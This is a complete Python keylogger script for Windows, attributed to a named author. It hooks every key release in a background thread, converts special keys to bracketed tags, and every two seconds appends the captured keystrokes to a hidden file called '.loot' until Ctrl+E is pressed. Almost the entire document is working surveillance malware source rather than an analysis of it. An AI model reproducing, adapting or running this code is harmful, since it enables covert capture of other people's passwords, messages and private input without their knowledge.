"""
    NAME            keylogger.py -- Portable Windows Keyboard Logger

    DESCRIPTION:    On execution, the program runs on background thread and 
                    records every keylogs into a specified file. 
                    To exit the program, hit Ctrl + E.

    AUTHOR:         Kuanysh Boranbayev

    DATE:           November 6, 2020

    VERSION:        1.0        
"""
#!/usr/bin/env python3
import sys, os, keyboard # for keylogs

# Semaphore is for blocking the current thread
# Timer is to make a method runs after an `interval` amount of time
from threading import Semaphore, Timer

OUTPUT_FILE_NAME = ".loot"
SEND_REPORT_EVERY = 2 # writes into a file every # second(s)
KEYWORD = "e[CTRL]" # exit program on Ctrl+E

class Keylogger:
    def __init__(self, interval):
    #def __init__(self):
        # we gonna pass SEND_REPORT_EVERY to interval
        self.interval = interval
        # this is the string variable that contains the log of all 
        # the keystrokes within `self.interval`
        self.log = ""
        # for blocking after setting the on_release listener
        self.semaphore = Semaphore(0)

    def callback(self, event):
        """
        This callback is invoked whenever a keyboard event is occured
        (i.e when a key is released in this example)
        """
        name = event.name
        if len(name) > 1:
            # not a character, special key (e.g ctrl, alt, etc.)
            # uppercase with []
            if name == "space":
                # " " instead of "space"
                name = " "
            elif name == "enter":
                # add a new line whenever an ENTER is pressed
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                # replace spaces with underscores
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        self.log += name

    def writeFile(self):
        f = open(OUTPUT_FILE_NAME, 'a+')
        f.write(self.log)
        f.close()
        if KEYWORD in self.log:
            print("Exit Hit")
            os._exit(1)

    def report(self):
        """
        This function gets called every `self.interval`
        It basically records keylogs and resets `self.log` variable
        """
        if self.log:
            # can print to a file, whatever you want
            self.writeFile()
            #print(self.log)
        self.log = ""
        Timer(interval=self.interval, function=self.report).start()

    def start(self):
        # start the keylogger
        keyboard.on_release(callback=self.callback)
        # start reporting the keylogs
        self.report()
        # block the current thread,
        # since on_release() doesn't block the current thread
        # if we don't block it, when we execute the program, nothing will happen
        # that is because on_release() will start the listener in a separate thread
        self.semaphore.acquire()

# Start main here
if __name__ == "__main__":
    keylogger = Keylogger(interval=SEND_REPORT_EVERY)
    keylogger.start()
